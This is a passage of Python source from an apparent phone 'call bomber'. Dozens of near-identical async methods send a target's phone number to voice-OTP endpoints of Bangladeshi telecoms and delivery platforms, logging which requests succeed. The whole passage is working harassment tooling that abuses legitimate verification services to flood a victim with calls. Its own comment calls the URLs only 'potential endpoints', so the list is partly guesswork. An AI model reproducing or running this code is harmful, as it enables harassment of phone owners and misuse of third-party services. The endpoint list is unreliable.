        url = endpoints[24 % len(endpoints)]
        try:
            payload = {"phone": target, "msisdn": target, "phoneNumber": target, "type": "voice", "method": "voice"}
            async with self.session.post(url, json=payload, headers=self.get_headers(url), timeout=10) as res:
                success = res.status in [200, 201]
                await self.log_event("CALL24 - Extra API 24", success, res.status, fmt=current_api_fmt.get())
                return success
        except Exception:
            await self.log_event("CALL24 - Extra API 24", False, "Error", fmt=current_api_fmt.get())
            return False

    @smart_api
    async def api_call25___extra_call_api_25(self):
        api_name = "Call25 - Extra Call 25"
        if self.smart.is_blocked(api_name): return False
        fmt = self.smart.get_format(api_name)
        target = NumberFormatter.format(self.target, fmt)
        # Using a variety of potential endpoints
        endpoints = [
            "https://api.robi.com.bd/vas/v1/otp/send",
            "https://v-app.banglalink.net/api/v1/send-otp",
            "https://www.grameenphone.com/api/v1/otp/send",
            "https://api.airtel.com.bd/vas/v1/otp/send",
            "https://chaldal.com/api/customer/SendVoiceOTP",
            "https://www.foodpanda.com.bd/api/v1/otp/send-voice",
            "https://api.evaly.com.bd/go-auth/api/v1/auth/otp/send-voice",
            "https://api.hungrynaki.com/v1/auth/otp/send-voice"
        ]
        url = endpoints[25 % len(endpoints)]
        try:
            payload = {"phone": target, "msisdn": target, "phoneNumber": target, "type": "voice", "method": "voice"}
            async with self.session.post(url, json=payload, headers=self.get_headers(url), timeout=10) as res:
                success = res.status in [200, 201]
                await self.log_event("CALL25 - Extra API 25", success, res.status, fmt=current_api_fmt.get())
                return success
        except Exception:
            await self.log_event("CALL25 - Extra API 25", False, "Error", fmt=current_api_fmt.get())
            return False

    @smart_api
    async def api_call26___extra_call_api_26(self):
        api_name = "Call26 - Extra Call 26"
        if self.smart.is_blocked(api_name): return False
        fmt = self.smart.get_format(api_name)
        target = NumberFormatter.format(self.target, fmt)
        # Using a variety of potential endpoints
        endpoints = [
            "https://api.robi.com.bd/vas/v1/otp/send",
            "https://v-app.banglalink.net/api/v1/send-otp",
            "https://www.grameenphone.com/api/v1/otp/send",
            "https://api.airtel.com.bd/vas/v1/otp/send",
            "https://chaldal.com/api/customer/SendVoiceOTP",
            "https://www.foodpanda.com.bd/api/v1/otp/send-voice",
            "https://api.evaly.com.bd/go-auth/api/v1/auth/otp/send-voice",
            "https://api.hungrynaki.com/v1/auth/otp/send-voice"
        ]
        url = endpoints[26 % len(endpoints)]
        try:
            payload = {"phone": target, "msisdn": target, "phoneNumber": target, "type": "voice", "method": "voice"}
            async with self.session.post(url, json=payload, headers=self.get_headers(url), timeout=10) as res:
                success = res.status in [200, 201]
                await self.log_event("CALL26 - Extra API 26", success, res.status, fmt=current_api_fmt.get())
                return success
        except Exception:
            await self.log_event("CALL26 - Extra API 26", False, "Error", fmt=current_api_fmt.get())
            return False

    @smart_api
    async def api_call27___extra_call_api_27(self):
        api_name = "Call27 - Extra Call 27"
        if self.smart.is_blocked(api_name): return False
        fmt = self.smart.get_format(api_name)
        target = NumberFormatter.format(self.target, fmt)
        # Using a variety of potential endpoints
        endpoints = [
            "https://api.robi.com.bd/vas/v1/otp/send",
            "https://v-app.banglalink.net/api/v1/send-otp",
            "https://www.grameenphone.com/api/v1/otp/send",
            "https://api.airtel.com.bd/vas/v1/otp/send",
            "https://chaldal.com/api/customer/SendVoiceOTP",
            "https://www.foodpanda.com.bd/api/v1/otp/send-voice",
            "https://api.evaly.com.bd/go-auth/api/v1/auth/otp/send-voice",
            "https://api.hungrynaki.com/v1/auth/otp/send-voice"
        ]
        url = endpoints[27 % len(endpoints)]
        try:
            payload = {"phone": target, "msisdn": target, "phoneNumber": target, "type": "voice", "method": "voice"}
            async with self.session.post(url, json=payload, headers=self.get_headers(url), timeout=10) as res:
                success = res.status in [200, 201]
                await self.log_event("CALL27 - Extra API 27", success, res.status, fmt=current_api_fmt.get())
                return success
        except Exception:
            await self.log_event("CALL27 - Extra API 27", False, "Error", fmt=current_api_fmt.get())
            return False

    @smart_api
    async def api_call28___extra_call_api_28(self):
        api_name = "Call28 - Extra Call 28"
        if self.smart.is_blocked(api_name): return False
        fmt = self.smart.get_format(api_name)
        target = NumberFormatter.format(self.target, fmt)
        # Using a variety of potential endpoints
        endpoints = [
            "https://api.robi.com.bd/vas/v1/otp/send",
            "https://v-app.banglalink.net/api/v1/send-otp",
            "https://www.grameenphone.com/api/v1/otp/send",
            "https://api.airtel.com.bd/vas/v1/otp/send",
            "https://chaldal.com/api/customer/SendVoiceOTP",
            "https://www.foodpanda.com.bd/api/v1/otp/send-voice",
            "https://api.evaly.com.bd/go-auth/api/v1/auth/otp/send-voice",
            "https://api.hungrynaki.com/v1/auth/otp/send-voice"
        ]
        url = endpoints[28 % len(endpoints)]
        try:
            payload = {"phone": target, "msisdn": target, "phoneNumber": target, "type": "voice", "method": "voice"}
            async with self.session.post(url, json=payload, headers=self.get_headers(url), timeout=10) as res:
                success = res.status in [200, 201]
                await self.log_event("CALL28 - Extra API 28", success, res.status, fmt=current_api_fmt.get())
                return success
        except Exception:
            await self.log_event("CALL28 - Extra API 28", False, "Error", fmt=current_api_fmt.get())
            return False

    @smart_api
    async def api_call29___extra_call_api_29(self):
        api_name = "Call29 - Extra Call 29"
        if self.smart.is_blocked(api_name): return False
        fmt = self.smart.get_format(api_name)
        target = NumberFormatter.format(self.target, fmt)
        # Using a variety of potential endpoints
        endpoints = [
            "https://api.robi.com.bd/vas/v1/otp/send",
            "https://v-app.banglalink.net/api/v1/send-otp",
            "https://www.grameenphone.com/api/v1/otp/send",
            "https://api.airtel.com.bd/vas/v1/otp/send",
            "https://chaldal.com/api/customer/SendVoiceOTP",
            "https://www.foodpanda.com.bd/api/v1/otp/send-voice",
            "https://api.evaly.com.bd/go-auth/api/v1/auth/otp/send-voice",
            "https://api.hungrynaki.com/v1/auth/otp/send-voice"
        ]
        url = endpoints[29 % len(endpoints)]
        try:
            payload = {"phone": target, "msisdn": target, "phoneNumber": target, "type": "voice", "method": "voice"}
            async with self.session.post(url, json=payload, headers=self.get_headers(url), timeout=10) as res:
                success = res.status in [200, 201]
                await self.log_event("CALL29 - Extra API 29", success, res.status, fmt=current_api_fmt.get())
                return success
        except Exception:
            await self.log_event("CALL29 - Extra API 29", False, "Error", fmt=current_api_fmt.get())
            return False

    @smart_api
    async def api_call30___extra_call_api_30(self):
        api_name = "Call30 - Extra Call 30"
        if self.smart.is_blocked(api_name): return False
        fmt = self.smart.get_format(api_name)
        target = NumberFormatter.format(self.target, fmt)
        # Using a variety of potential endpoints
        endpoints = [
            "https://api.robi.com.bd/vas/v1/otp/send",
            "https://v-app.banglalink.net/api/v1/send-otp",
            "https://www.grameenphone.com/api/v1/otp/send",
            "https://api.airtel.com.bd/vas/v1/otp/send",
            "https://chaldal.com/api/customer/SendVoiceOTP",
            "https://www.foodpanda.com.bd/api/v1/otp/send-voice",
            "https://api.evaly.com.bd/go-auth/api/v1/auth/otp/send-voice",
            "https://api.hungrynaki.com/v1/auth/otp/send-voice"
        ]
        url = endpoints[30 % len(endpoints)]
        try:
            payload = {"phone": target, "msisdn": target, "phoneNumber": target, "type": "voice", "method": "voice"}
            async with self.session.post(url, json=payload, headers=self.get_headers(url), timeout=10) as res:
                success = res.status in [200, 201]
                await self.log_event("CALL30 - Extra API 30", success, res.status, fmt=current_api_fmt.get())
                return success
        except Exception:
            await self.log_event("CALL30 - Extra API 30", False, "Error", fmt=current_api_fmt.get())
            return False

    @smart_api
    async def api_call31___extra_call_api_31(self):
        api_name = "Call31 - Extra Call 31"
        if self.smart.is_blocked(api_name): return False
        fmt = self.smart.get_format(api_name)
        target = NumberFormatter.format(self.target, fmt)
        # Using a variety of potential endpoints
        endpoints = [
            "https://api.robi.com.bd/vas/v1/otp/send",
            "https://v-app.banglalink.net/api/v1/send-otp",
            "https://www.grameenphone.com/api/v1/otp/send",
            "https://api.airtel.com.bd/vas/v1/otp/send",
            "https://chaldal.com/api/customer/SendVoiceOTP",
            "https://www.foodpanda.com.bd/api/v1/otp/send-voice",
            "https://api.evaly.com.bd/go-auth/api/v1/auth/otp/send-voice",
            "https://api.hungrynaki.com/v1/auth/otp/send-voice"
        ]
        url = endpoints[31 % len(endpoints)]
        try:
            payload = {"phone": target, "msisdn": target, "phoneNumber": target, "type": "voice", "method": "voice"}
            async with self.session.post(url, json=payload, headers=self.get_headers(url), timeout=10) as res:
                success = res.status in [200, 201]
                await self.log_event("CALL31 - Extra API 31", success, res.status, fmt=current_api_fmt.get())
                return success
        except Exception:
            await self.log_event("CALL31 - Extra API 31", False, "Error", fmt=current_api_fmt.get())
            return False

    @smart_api
    async def api_call32___extra_call_api_32(self):
        api_name = "Call32 - Extra Call 32"
        if self.smart.is_blocked(api_name): return False
        fmt = self.smart.get_format(api_name)
        target = NumberFormatter.format(self.target, fmt)
        # Using a variety of potential endpoints
        endpoints = [
            "https://api.robi.com.bd/vas/v1/otp/send",
            "https://v-app.banglalink.net/api/v1/send-otp",
            "https://www.grameenphone.com/api/v1/otp/send",
            "https://api.airtel.com.bd/vas/v1/otp/send",
            "https://chaldal.com/api/customer/SendVoiceOTP",
            "https://www.foodpanda.com.bd/api/v1/otp/send-voice",
            "https://api.evaly.com.bd/go-auth/api/v1/auth/otp/send-voice",
            "https://api.hungrynaki.com/v1/auth/otp/send-voice"
        ]
        url = endpoints[32 % len(endpoints)]
        try:
            payload = {"phone": target, "msisdn": target, "phoneNumber": target, "type": "voice", "method": "voice"}
            async with self.session.post(url, json=payload, headers=self.get_headers(url), timeout=10) as res:
                success = res.status in [200, 201]
                await self.log_event("CALL32 - Extra API 32", success, res.status, fmt=current_api_fmt.get())
                return success
        except Exception:
            await self.log_event("CALL32 - Extra API 32", False, "Error", fmt=current_api_fmt.get())
            return False

    @smart_api
    async def api_call33___extra_call_api_33(self):
        api_name = "Call33 - Extra Call 33"
        if self.smart.is_blocked(api_name): return False
        fmt = self.smart.get_format(api_name)
        target = NumberFormatter.format(self.target, fmt)
        # Using a variety of potential endpoints
        endpoints = [
            "https://api.robi.com.bd/vas/v1/otp/send",
            "https://v-app.banglalink.net/api/v1/send-otp",
            "https://www.grameenphone.com/api/v1/otp/send",
            "https://api.airtel.com.bd/vas/v1/otp/send",
            "https://chaldal.com/api/customer/SendVoiceOTP",
            "https://www.foodpanda.com.bd/api/v1/otp/send-voice",
            "https://api.evaly.com.bd/go-auth/api/v1/auth/otp/send-voice",
            "https://api.hungrynaki.com/v1/auth/otp/send-voice"
        ]
        url = endpoints[33 % len(endpoints)]
        try:
            payload = {"phone": target, "msisdn": target, "phoneNumber": target, "type": "voice", "method": "voice"}
            async with self.session.post(url, json=payload, headers=self.get_headers(url), timeout=10) as res:
                success = res.status in [200, 201]
                await self.log_event("CALL33 - Extra API 33", success, res.status, fmt=current_api_fmt.get())
                return success
        except Exception:
            await self.log_event("CALL33 - Extra API 33", False, "Error", fmt=current_api_fmt.get())
            return False

    @smart_api
    async def api_call34___extra_call_api_34(self):
        api_name = "Call34 - Extra Call 34"
        if self.smart.is_blocked(api_name): return False
        fmt = self.smart.get_format(api_name)
        target = NumberFormatter.format(self.target, fmt)
        # Using a variety of potential endpoints
        endpoints = [
            "https://api.robi.com.bd/vas/v1/otp/send",
            "https://v-app.banglalink.net/api/v1/send-otp",
            "https://www.grameenphone.com/api/v1/otp/send",
            "https://api.airtel.com.bd/vas/v1/otp/send",
            "https://chaldal.com/api/customer/SendVoiceOTP",
            "https://www.foodpanda.com.bd/api/v1/otp/send-voice",
            "https://api.evaly.com.bd/go-auth/api/v1/auth/otp/send-voice",
            "https://api.hungrynaki.com/v1/auth/otp/send-voice"
        ]
        url = endpoints[34 % len(endpoints)]
        try:
            payload = {"phone": target, "msisdn": target, "phoneNumber": target, "type": "voice", "method": "voice"}
            async with self.session.post(url, json=payload, headers=self.get_headers(url), timeout=10) as res:
                success = res.status in [200, 201]
                await self.log_event("CALL34 - Extra API 34", success, res.status, fmt=current_api_fmt.get())
                return success
        except Exception:
            await self.log_event("CALL34 - Extra API 34", False, "Error", fmt=current_api_fmt.get())
            return False

    @smart_api
    async def api_call35___extra_call_api_35(self):
        api_name = "Call35 - Extra Call 35"
        if self.smart.is_blocked(api_name): return False
        fmt = self.smart.get_format(api_name)
        target = NumberFormatter.format(self.target, fmt)
        # Using a variety of potential endpoints
        endpoints = [
            "https://api.robi.com.bd/vas/v1/otp/send",
            "https://v-app.banglalink.net/api/v1/send-otp",
            "https://www.grameenphone.com/api/v1/otp/send",
            "https://api.airtel.com.bd/vas/v1/otp/send",
            "https://chaldal.com/api/customer/SendVoiceOTP",
            "https://www.foodpanda.com.bd/api/v1/otp/send-voice",
            "https://api.evaly.com.bd/go-auth/api/v1/auth/otp/send-voice",
            "https://api.hungrynaki.com/v1/auth/otp/send-voice"
        ]
        url = endpoints[35 % len(endpoints)]
        try:
            payload = {"phone": target, "msisdn": target, "phoneNumber": target, "type": "voice", "method": "voice"}
            async with self.session.post(url, json=payload, headers=self.get_headers(url), timeout=10) as res:
                success = res.status in [200, 201]
                await self.log_event("CALL35 - Extra API 35", success, res.status, fmt=current_api_fmt.get())
                return success
        except Exception:
            await self.log_event("CALL35 - Extra API 35", False, "Error", fmt=current_api_fmt.get())
            return False

    @smart_api
    async def api_call36___extra_call_api_36(self):
        api_name = "Call36 - Extra Call 36"
        if self.smart.is_blocked(api_name): return False
        fmt = self.smart.get_format(api_name)
        target = NumberFormatter.format(self.target, fmt)
        # Using a variety of potential endpoints
        endpoints = [
            "https://api.robi.com.bd/vas/v1/otp/send",
            "https://v-app.banglalink.net/api/v1/send-otp",
            "https://www.grameenphone.com/api/v1/otp/send",
            "https://api.airtel.com.bd/vas/v1/otp/send",
            "https://chaldal.com/api/customer/SendVoiceOTP",
            "https://www.foodpanda.com.bd/api/v1/otp/send-voice",
            "https://api.evaly.com.bd/go-auth/api/v1/auth/otp/send-voice",
            "https://api.hungrynaki.com/v1/auth/otp/send-voice"
        ]
        url = endpoints[36 % len(endpoints)]
        try:
            payload = {"phone": target, "msisdn": target, "phoneNumber": target, "type": "voice", "method": "voice"}
            async with self.session.post(url, json=payload, headers=self.get_headers(url), timeout=10) as res:
                success = res.status in [200, 201]
                await self.log_event("CALL36 - Extra API 36", success, res.status, fmt=current_api_fmt.get())
                return success
        except Exception:
            await self.log_event("CALL36 - Extra API 36", False, "Error", fmt=current_api_fmt.get())
            return False

    @smart_api
    async def api_call37___extra_call_api_37(self):
        api_name = "Call37 - Extra Call 37"
        if self.smart.is_blocked(api_name): return False
        fmt = self.smart.get_format(api_name)
        target = NumberFormatter.format(self.target, fmt)
        # Using a variety of potential endpoints
        endpoints = [
            "https://api.robi.com.bd/vas/v1/otp/send",
            "https://v-app.banglalink.net/api/v1/send-otp",
            "https://www.grameenphone.com/api/v1/otp/send",
            "https://api.airtel.com.bd/vas/v1/otp/send",
            "https://chaldal.com/api/customer/SendVoiceOTP",
            "https://www.foodpanda.com.bd/api/v1/otp/send-voice",
            "https://api.evaly.com.bd/go-auth/api/v1/auth/otp/send-voice",
            "https://api.hungrynaki.com/v1/auth/otp/send-voice"
        ]
        url = endpoints[37 % len(endpoints)]
        try:
            payload = {"phone": target, "msisdn": target, "phoneNumber": target, "type": "voice", "method": "voice"}
            async with self.session.post(url, json=payload, headers=self.get_headers(url), timeout=10) as res:
                success = res.status in [200, 201]
                await self.log_event("CALL37 - Extra API 37", success, res.status, fmt=current_api_fmt.get())
                return success
        except Exception:
            await self.log_event("CALL37 - Extra API 37", False, "Error", fmt=current_api_fmt.get())
            return False

    @smart_api
    async def api_call38___extra_call_api_38(self):
        api_name = "Call38 - Extra Call 38"
        if self.smart.is_blocked(api_name): return False
        fmt = self.smart.get_format(api_name)
        target = NumberFormatter.format(self.target, fmt)
        # Using a variety of potential endpoints
        endpoints = [
            "https://api.robi.com.bd/vas/v1/otp/send",
            "https://v-app.banglalink.net/api/v1/send-otp",
            "https://www.grameenphone.com/api/v1/otp/send",
            "https://api.airtel.com.bd/vas/v1/otp/send",
            "https://chaldal.com/api/customer/SendVoiceOTP",
            "https://www.foodpanda.com.bd/api/v1/otp/send-voice",
            "https://api.evaly.com.bd/go-auth/api/v1/auth/otp/send-voice",
            "https://api.hungrynaki.com/v1/auth/otp/send-voice"
        ]
        url = endpoints[38 % len(endpoints)]
        try:
            payload = {"phone": target, "msisdn": target, "phoneNumber": target, "type": "voice", "method": "voice"}
            async with self.session.post(url, json=payload, headers=self.get_headers(url), timeout=10) as res:
                success = res.status in [200, 201]
                await self.log_event("CALL38 - Extra API 38", success, res.status, fmt=current_api_fmt.get())
                return success
        except Exception:
            await self.log_event("CALL38 - Extra API 38", False, "Error", fmt=current_api_fmt.get())
            return False

    @smart_api
    async def api_call39___extra_call_api_39(self):
        api_name = "Call39 - Extra Call 39"
        if self.smart.is_blocked(api_name): return False
        fmt = self.smart.get_format(api_name)
        target = NumberFormatter.format(self.target, fmt)
        # Using a variety of potential endpoints
        endpoints = [
            "https://api.robi.com.bd/vas/v1/otp/send",
            "https://v-app.banglalink.net/api/v1/send-otp",
            "https://www.grameenphone.com/api/v1/otp/send",
            "https://api.airtel.com.bd/vas/v1/otp/send",
            "https://chaldal.com/api/customer/SendVoiceOTP",
            "https://www.foodpanda.com.bd/api/v1/otp/send-voice",
            "https://api.evaly.com.bd/go-auth/api/v1/auth/otp/send-voice",
            "https://api.hungrynaki.com/v1/auth/otp/send-voice"
        ]
        url = endpoints[39 % len(endpoints)]
        try:
            payload = {"phone": target, "msisdn": target, "phoneNumber": target, "type": "voice", "method": "voice"}
            async with self.session.post(url, json=payload, headers=self.get_headers(url), timeout=10) as res:
                success = res.status in [200, 201]
                await self.log_event("CALL39 - Extra API 39", success, res.status, fmt=current_api_fmt.get())
                return success
        except Exception:
            await self.log_event("CALL39 - Extra API 39", False, "Error", fmt=current_api_fmt.get())
            return False

    @smart_api
    async def api_call40___extra_call_api_40(self):
        api_name = "Call40 - Extra Call 40"
        if self.smart.is_blocked(api_name): return False
        fmt = self.smart.get_format(api_name)
        target = NumberFormatter.format(self.target, fmt)
        # Using a variety of potential endpoints
        endpoints = [
            "https://api.robi.com.bd/vas/v1/otp/send",
            "https://v-app.banglalink.net/api/v1/send-otp",
            "https://www.grameenphone.com/api/v1/otp/send",
            "https://api.airtel.com.bd/vas/v1/otp/send",
            "https://chaldal.com/api/customer/SendVoiceOTP",
            "https://www.foodpanda.com.bd/api/v1/otp/send-voice",
            "https://api.evaly.com.bd/go-auth/api/v1/auth/otp/send-voice",
            "https://api.hungrynaki.com/v1/auth/otp/send-voice"
        ]
        url = endpoints[40 % len(endpoints)]
        try:
            payload = {"phone": target, "msisdn": target, "phoneNumber": target, "type": "voice", "method": "voice"}
            async with self.session.post(url, json=payload, headers=self.get_headers(url), timeout=10) as res:
                success = res.status in [200, 201]
                await self.log_event("CALL40 - Extra API 40", success, res.status, fmt=current_api_fmt.get())
                return success
        except Exception:
            await self.log_event("CALL40 - Extra API 40", False, "Error", fmt=current_api_fmt.get())
            return False

    @smart_api
    async def api_call41___extra_call_api_41(self):
        api_name = "Call41 - Extra Call 41"
        if self.smart.is_blocked(api_name): return False
        fmt = self.smart.get_format(api_name)
        target = NumberFormatter.format(self.target, fmt)
        # Using a variety of potential endpoints
        endpoints = [
            "https://api.robi.com.bd/vas/v1/otp/send",
            "https://v-app.banglalink.net/api/v1/send-otp",
            "https://www.grameenphone.com/api/v1/otp/send",
            "https://api.airtel.com.bd/vas/v1/otp/send",
            "https://chaldal.com/api/customer/SendVoiceOTP",
            "https://www.foodpanda.com.bd/api/v1/otp/send-voice",
            "https://api.evaly.com.bd/go-auth/api/v1/auth/otp/send-voice",
            "https://api.hungrynaki.com/v1/auth/otp/send-voice"
        ]
        url = endpoints[41 % len(endpoints)]
        try:
            payload = {"phone": target, "msisdn": target, "phoneNumber": target, "type": "voice", "method": "voice"}
            async with self.session.post(url, json=payload, headers=self.get_headers(url), timeout=10) as res:
                success = res.status in [200, 201]
                await self.log_event("CALL41 - Extra API 41", success, res.status, fmt=current_api_fmt.get())
                return success
        except Exception:
            await self.log_event("CALL41 - Extra API 41", False, "Error", fmt=current_api_fmt.get())
            return False

    @smart_api
    async def api_call42___extra_call_api_42(self):
        api_name = "Call42 - Extra Call 42"
        if self.smart.is_blocked(api_name): return False
        fmt = self.smart.get_format(api_name)
        target = NumberFormatter.format(self.target, fmt)
        # Using a variety of potential endpoints
        endpoints = [
            "https://api.robi.com.bd/vas/v1/otp/send",
            "https://v-app.banglalink.net/api/v1/send-otp",
            "https://www.grameenphone.com/api/v1/otp/send",
            "https://api.airtel.com.bd/vas/v1/otp/send",
            "https://chaldal.com/api/customer/SendVoiceOTP",
            "https://www.foodpanda.com.bd/api/v1/otp/send-voice",
            "https://api.evaly.com.bd/go-auth/api/v1/auth/otp/send-voice",
            "https://api.hungrynaki.com/v1/auth/otp/send-voice"
        ]
        url = endpoints[42 % len(endpoints)]
        try:
            payload = {"phone": target, "msisdn": target, "phoneNumber": target, "type": "voice", "method": "voice"}
            async with self.session.post(url, json=payload, headers=self.get_headers(url), timeout=10) as res:
                success = res.status in [200, 201]
                await self.log_event("CALL42 - Extra API 42", success, res.status, fmt=current_api_fmt.get())
                return success
        except Exception:
            await self.log_event("CALL42 - Extra API 42", False, "Error", fmt=current_api_fmt.get())
            return False

    @smart_api
    async def api_call43___extra_call_api_43(self):
        api_name = "Call43 - Extra Call 43"
        if self.smart.is_blocked(api_name): return False
        fmt = self.smart.get_format(api_name)
        target = NumberFormatter.format(self.target, fmt)
        # Using a variety of potential endpoints
        endpoints = [
            "https://api.robi.com.bd/vas/v1/otp/send",
            "https://v-app.banglalink.net/api/v1/send-otp",
            "https://www.grameenphone.com/api/v1/otp/send",
            "https://api.airtel.com.bd/vas/v1/otp/send",
            "https://chaldal.com/api/customer/SendVoiceOTP",
            "https://www.foodpanda.com.bd/api/v1/otp/send-voice",
            "https://api.evaly.com.bd/go-auth/api/v1/auth/otp/send-voice",
            "https://api.hungrynaki.com/v1/auth/otp/send-voice"
        ]
        url = endpoints[43 % len(endpoints)]
        try:
            payload = {"phone": target, "msisdn": target, "phoneNumber": target, "type": "voice", "method": "voice"}
            async with self.session.post(url, json=payload, headers=self.get_headers(url), timeout=10) as res:
                success = res.status in [200, 201]
                await self.log_event("CALL43 - Extra API 43", success, res.status, fmt=current_api_fmt.get())
                return success
        except Exception:
            await self.log_event("CALL43 - Extra API 43", False, "Error", fmt=current_api_fmt.get())
            return False

    @smart_api
    async def api_call44___extra_call_api_44(self):
        api_name = "Call44 - Extra Call 44"
        if self.smart.is_blocked(api_name): return False
        fmt = self.smart.get_format(api_name)
        target = NumberFormatter.format(self.target, fmt)
        # Using a variety of potential endpoints
        endpoints = [
            "https://api.robi.com.bd/vas/v1/otp/send",
            "https://v-app.banglalink.net/api/v1/send-otp",
            "https://www.grameenphone.com/api/v1/otp/send",
            "https://api.airtel.com.bd/vas/v1/otp/send",
            "https://chaldal.com/api/customer/SendVoiceOTP",
            "https://www.foodpanda.com.bd/api/v1/otp/send-voice",
            "https://api.evaly.com.bd/go-auth/api/v1/auth/otp/send-voice",
            "https://api.hungrynaki.com/v1/auth/otp/send-voice"
        ]
        url = endpoints[44 % len(endpoints)]
        try:
            payload = {"phone": target, "msisdn": target, "phoneNumber": target, "type": "voice", "method": "voice"}
            async with self.session.post(url, json=payload, headers=self.get_headers(url), timeout=10) as res:
                success = res.status in [200, 201]
                await self.log_event("CALL44 - Extra API 44", success, res.status, fmt=current_api_fmt.get())
                return success
        except Exception:
            await self.log_event("CALL44 - Extra API 44", False, "Error", fmt=current_api_fmt.get())
            return False

    @smart_api
    async def api_call45___extra_call_api_45(self):
        api_name = "Call45 - Extra Call 45"
        if self.smart.is_blocked(api_name): return False
        fmt = self.smart.get_format(api_name)
        target = NumberFormatter.format(self.target, fmt)
        # Using a variety of potential endpoints
        endpoints = [
            "https://api.robi.com.bd/vas/v1/otp/send",
            "https://v-app.banglalink.net/api/v1/send-otp",
            "https://www.grameenphone.com/api/v1/otp/send",
            "https://api.airtel.com.bd/vas/v1/otp/send",
            "https://chaldal.com/api/customer/SendVoiceOTP",
            "https://www.foodpanda.com.bd/api/v1/otp/send-voice",
            "https://api.evaly.com.bd/go-auth/api/v1/auth/otp/send-voice",
            "https://api.hungrynaki.com/v1/auth/otp/send-voice"
        ]
        url = endpoints[45 % len(endpoints)]
        try:
            payload = {"phone": target, "msisdn": target, "phoneNumber": target, "type": "voice", "method": "voice"}
            async with self.session.post(url, json=payload, headers=self.get_headers(url), timeout=10) as res:
                success = res.status in [200, 201]
                await self.log_event("CALL45 - Extra API 45", success, res.status, fmt=current_api_fmt.get())
                return success
        except Exception:
            await self.log_event("CALL45 - Extra API 45", False, "Error", fmt=current_api_fmt.get())
            return False

    @smart_api
    async def api_call46___extra_call_api_46(self):
        api_name = "Call46 - Extra Call 46"
        if self.smart.is_blocked(api_name): return False
        fmt = self.smart.get_format(api_name)
        target = NumberFormatter.format(self.target, fmt)
        # Using a variety of potential endpoints
        endpoints = [
            "https://api.robi.com.bd/vas/v1/otp/send",
            "https://v-app.banglalink.net/api/v1/send-otp",
            "https://www.grameenphone.com/api/v1/otp/send",
            "https://api.airtel.com.bd/vas/v1/otp/send",
            "https://chaldal.com/api/customer/SendVoiceOTP",
            "https://www.foodpanda.com.bd/api/v1/otp/send-voice",
            "https://api.evaly.com.bd/go-auth/api/v1/auth/otp/send-voice",
            "https://api.hungrynaki.com/v1/auth/otp/send-voice"
        ]
        url = endpoints[46 % len(endpoints)]
        try:
            payload = {"phone": target, "msisdn": target, "phoneNumber": target, "type": "voice", "method": "voice"}
            async with self.session.post(url, json=payload, headers=self.get_headers(url), timeout=10) as res:
                success = res.status in [200, 201]
                await self.log_event("CALL46 - Extra API 46", success, res.status, fmt=current_api_fmt.get())
                return success
        except Exception:
            await self.log_event("CALL46 - Extra API 46", False, "Error", fmt=current_api_fmt.get())
            return False

    @smart_api
    async def api_call47___extra_call_api_47(self):
        api_name = "Call47 - Extra Call 47"
        if self.smart.is_blocked(api_name): return False
        fmt = self.smart.get_format(api_name)
        target = NumberFormatter.format(self.target, fmt)
        # Using a variety of potential endpoints
        endpoints = [
            "https://api.robi.com.bd/vas/v1/otp/send",
            "https://v-app.banglalink.net/api/v1/send-otp",
            "https://www.grameenphone.com/api/v1/otp/send",
            "https://api.airtel.com.bd/vas/v1/otp/send",
            "https://chaldal.com/api/customer/SendVoiceOTP",
            "https://www.foodpanda.com.bd/api/v1/otp/send-voice",
            "https://api.evaly.com.bd/go-auth/api/v1/auth/otp/send-voice",
            "https://api.hungrynaki.com/v1/auth/otp/send-voice"
        ]
        url = endpoints[47 % len(endpoints)]
        try:
            payload = {"phone": target, "msisdn": target, "phoneNumber": target, "type": "voice", "method": "voice"}
            async with self.session.post(url, json=payload, headers=self.get_headers(url), timeout=10) as res:
                success = res.status in [200, 201]
                await self.log_event("CALL47 - Extra API 47", success, res.status, fmt=current_api_fmt.get())
                return success
        except Exception:
            await self.log_event("CALL47 - Extra API 47", False, "Error", fmt=current_api_fmt.get())
            return False

    @smart_api
    async def api_call48___extra_call_api_48(self):
        api_name = "Call48 - Extra Call 48"
        if self.smart.is_blocked(api_name): return False
        fmt = self.smart.get_format(api_name)
        target = NumberFormatter.format(self.target, fmt)
        # Using a variety of potential endpoints
        endpoints = [
            "https://api.robi.com.bd/vas/v1/otp/send",
            "https://v-app.banglalink.net/api/v1/send-otp",
            "https://www.grameenphone.com/api/v1/otp/send",
            "https://api.airtel.com.bd/vas/v1/otp/send",
            "https://chaldal.com/api/customer/SendVoiceOTP",
            "https://www.foodpanda.com.bd/api/v1/otp/send-voice",
            "https://api.evaly.com.bd/go-auth/api/v1/auth/otp/send-voice",
            "https://api.hungrynaki.com/v1/auth/otp/send-voice"
        ]
        url = endpoints[48 % len(endpoints)]
        try:
            payload = {"phone": target, "msisdn": target, "phoneNumber": target, "type": "voice", "method": "voice"}
            async with self.session.post(url, json=payload, headers=self.get_headers(url), timeout=10) as res:
                success = res.status in [200, 201]
                await self.log_event("CALL48 - Extra API 48", success, res.status, fmt=current_api_fmt.get())
                return success
        except Exception:
            await self.log_event("CALL48 - Extra API 48", False, "Error", fmt=current_api_fmt.get())
            return False

    @smart_api
    async def api_call49___extra_call_api_49(self):
        api_name = "Call49 - Extra Call 49"
        if self.smart.is_blocked(api_name): return False
        fmt = self.smart.get_format(api_name)
        target = NumberFormatter.format(self.target, fmt)
        # Using a variety of potential endpoints
        endpoints = [
            "https://api.robi.com.bd/vas/v1/otp/send",
            "https://v-app.banglalink.net/api/v1/send-otp",
            "https://www.grameenphone.com/api/v1/otp/send",
            "https://api.airtel.com.bd/vas/v1/otp/send",
            "https://chaldal.com/api/customer/SendVoiceOTP",
            "https://www.foodpanda.com.bd/api/v1/otp/send-voice",
            "https://api.evaly.com.bd/go-auth/api/v1/auth/otp/send-voice",
            "https://api.hungrynaki.com/v1/auth/otp/send-voice"
        ]
        url = endpoints[49 % len(endpoints)]
        try:
            payload = {"phone": target, "msisdn": target, "phoneNumber": target, "type": "voice", "method": "voice"}
            async with self.session.post(url, json=payload, headers=self.get_headers(url), timeout=10) as res:
                success = res.status in [200, 201]
                await self.log_event("CALL49 - Extra API 49", success, res.status, fmt=current_api_fmt.get())
                return success
        except Exception:
            await self.log_event("CALL49 - Extra API 49", False, "Error", fmt=current_api_fmt.get())
            return False

    @smart_api
    async def api_call50___extra_call_api_50(self):
        api_name = "Call50 - Extra Call 50"
        if self.smart.is_blocked(api_name): return False
        fmt = self.smart.get_format(api_name)
        target = NumberFormatter.format(self.target, fmt)
        # Using a variety of potential endpoints
        endpoints = [
            "https://api.robi.com.bd/vas/v1/otp/send",
